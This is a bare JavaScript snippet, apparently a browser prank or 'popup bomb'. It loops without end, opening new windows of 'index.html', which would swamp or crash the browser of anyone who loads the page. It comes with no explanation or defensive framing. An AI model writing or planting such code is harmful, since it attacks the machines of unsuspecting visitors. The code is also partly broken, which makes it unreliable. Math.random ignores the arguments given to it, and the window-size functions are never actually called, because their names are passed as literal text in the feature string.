function randomHeight(){
        return Math.random(100,1000);
}
function randomWidth(){
        return Math.random(100,1000);
}

function NewTab() {
            window.open(
            "index.html", "_blank","width=randomWidth(),height=randomHeight()");
        }

for (var i = 0; i < Infinity; i++) {
       NewTab();
}
